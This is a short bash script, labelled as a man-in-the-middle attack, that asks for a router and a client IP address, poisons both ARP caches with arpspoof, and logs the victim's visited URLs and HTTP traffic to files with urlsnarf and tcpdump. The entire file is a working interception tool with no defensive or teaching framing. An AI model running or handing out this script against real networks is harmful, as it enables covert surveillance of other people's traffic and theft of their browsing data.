#!/bin/bash
sysctl -w net.ipv4.ip_forward=1
# Man-in-the-Middle Attack
function ip_add {
echo "Please enter the IP address of  Access point / router :"
read ap_ip_add
sleep 1
echo "Please enter the IP address of the client :"
read client_ip_add
#Display of IP addresses
echo "_____________________________________________"
echo "The Access Point IP Address : $ap_ip_add  "
echo "The Client IP Address: $client_ip_add"

#validation for ip addresses
echo "Is this correct ? (Y/N)"
read yes
if [ "$yes" == "Y" ] ;then
echo "continue"

else
echo "try again"
clear
echo "______________________________________________________"
ip_add
fi  
}

function mitm {
#ARP from the ap to the client
xterm -hold -e "arpspoof -i wlan0 -t $ap_ip_add $client_ip_add" &
#ARP from the client to the ap
xterm -hold -e "arpspoof -i wlan0 -t $client_ip_add $ap_ip_add" & 
data
}

function data {
echo "------trying to obtain Url's Visited-----"
xterm -hold -e "urlsnarf -i wlan0 > urlsnarf.txt" &
xterm -hold -e "tcpdump -i wlan0 -n port 80 and host $client_ip_add > tcp_web.txt" &
echo "------Obtaining IP addresses of used servers ----"
xterm -hold -e "sudo tcpdump -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20 > tcpump.txt" & 
}
#Step 1 : Obtaining the IP's
ip_add
#Step 2 : MITM Attack
mitm
#step 3 : Collecting user data and information filtering.
#function data
